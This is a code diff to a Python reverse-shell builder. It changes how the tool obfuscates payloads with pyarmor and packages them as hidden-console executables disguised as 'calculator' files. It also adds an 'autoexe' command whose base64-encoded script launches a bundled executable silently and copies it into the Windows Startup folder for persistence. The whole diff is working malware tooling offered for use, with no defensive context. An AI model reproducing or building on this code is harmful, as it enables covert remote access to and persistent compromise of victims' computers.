@@ -7,12 +7,13 @@ import os
 import base64
 import tempfile
 import platform
-
+import datetime
 variablesConfig: dict = {
     "session.lhost": "localhost",
     "session.lport": 4444,
     "generate.lhost": "localhost",
     "generate.lport": 4444,
+    "windows.autoexe.path": None,
 }
 
 
@@ -54,7 +55,7 @@ def read_payload():
             .replace("${LPORT}", str(variablesConfig["generate.lport"]))
         )
 
-def generate(command):
+def generate(_):
   try:
     payload = read_payload()
     print(f"{Color.WARNING}Generating payload{Color.DEFAULT}")
@@ -69,26 +70,21 @@ def generate(command):
     subprocess.run(["pyarmor", "gen", temp.name], stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL ,creationflags=flag)
 
-
     ofuscated_path = os.path.join("dist", os.path.basename(temp.name))
 
     print(f"{Color.OKGREEN}Building payload{Color.DEFAULT}")
 
-    subprocess.run(["pyinstaller", "--onefile","--noconsole", ofuscated_path],  
-                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
-                     stdin=subprocess.DEVNULL,creationflags=flag)
+    subprocess.run(["pyinstaller", "--onefile","--noconsole", ofuscated_path],  stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stdin=subprocess.DEVNULL,creationflags=flag)
 
     print(f"{Color.OKGREEN}Payload generated successfully{Color.DEFAULT}")
 
     extension = ".exe" if platform.system() == 'Windows' else ""
 
-    namefile = os.path.join(os.getcwd(), f"calculator{extension}")
+    fileId = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
+    namefile = os.path.join(os.getcwd(), f"calculator-{fileId}{extension}")
 
     if(os.path.exists(ofuscated_path)):
         os.rename(f"{ofuscated_path}{extension}", namefile)
-
-    if(extension != ""):
-       os.remove(ofuscated_path)
 
     if(os.path.exists(temp.name)):
         os.remove(temp.name)
@@ -99,6 +95,38 @@ def generate(command):
     pass
 
 
+def autoexe(_):
+     path = variablesConfig["windows.autoexe.path"]
+     if platform.system() != 'Windows':
+            print(f"{Color.FAIL}This command only works on Windows{Color.DEFAULT}")
+            return
+     if path is None:
+         print(f"{Color.FAIL}Path of .exe not set{Color.DEFAULT}")
+         return
+     nameFile = os.path.basename(path)
+
+     payload = base64.b64decode("aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IG9zCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgc2h1dGlsCmltcG9ydCBzeXMKdHJ5OgogICAgaWYgcGxhdGZvcm0uc3lzdGVtKCkgIT0gIldpbmRvd3MiOiBleGl0KCkKCiAgICBpZiBoYXNhdHRyKHN5cywgIl9NRUlQQVNTIikgaXMgRmFsc2U6IGV4aXQoKQogICAgCiAgICBleGVjdXRhYmxlID0gb3MucGF0aC5qb2luKHN5cy5fTUVJUEFTUywgJyR7bmFtZUV4ZWN1dGFibGV9JykKICAKICAgIHN0YXJ0dXBfZm9sZGVyID0gb3MucGF0aC5qb2luKAogICAgICAgIG9zLmVudmlyb25bIkFQUERBVEEiXSwgIk1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN0YXJ0dXAiCiAgICApCgogICAgcHJpbnQoc3RhcnR1cF9mb2xkZXIpCgogICAgc3VicHJvY2Vzcy5Qb3BlbihbZXhlY3V0YWJsZV0sIGNyZWF0aW9uZmxhZ3M9c3VicHJvY2Vzcy5DUkVBVEVfTk9fV0lORE9XKQoKICAgIHNodXRpbC5jb3B5KGV4ZWN1dGFibGUsIHN0YXJ0dXBfZm9sZGVyICsgIlxcIiArICcke25hbWVFeGVjdXRhYmxlfScpCgogICAgcHJpbnQoIkNsaWVudCBsYXVuY2hlZCBzdWNjZXNzZnVsbHkiKQoKCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgIGV4aXQoKQo=")
+     payload = payload.decode().replace("${nameExecutable}", nameFile)
+
+     with tempfile.NamedTemporaryFile(delete=False, mode="w") as temp:
+        temp.write(payload)
+        temp.close()
+
+     print(f"{Color.OKGREEN}Building autoexe{Color.DEFAULT}")
+
+     subprocess.run(["pyinstaller",f"--add-data {path};.", "--onefile","--noconsole", temp.name],  stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stdin=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
+
+     fileId = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
+
+     namefile = os.path.join(os.getcwd(), f"autoexe-{fileId}.exe")
+
+     if(os.path.exists(temp.name)):
+        os.rename(f"{path}", namefile)
+        os.remove(temp.name)
+
+     print(f"{Color.OKGREEN}Autoexe generated successfully{Color.DEFAULT}")
+
+
 commands = {
     "help": {
         "description": "Show help message",
@@ -107,13 +135,18 @@ commands = {
     },
     "generate": {
         "description": "Generate a reverse shell",
-        "vars": ["lhost", "lport"],
+        "vars": ["generate.lhost", "generate.lport"],
         "action": generate,
     },
     "execute": {
         "description": "Start a session",
-        "vars": ["lhost", "lport"],
+        "vars": ["session.lhost", "session.lport"],
         "action": start_session,
+    },
+    "autoexe": {
+        "description": "execute on startup",
+        "vars": ["windows.autoexe.path"],
+        "action": autoexe,
     },
     "set": {
         "description": "Set a variable",
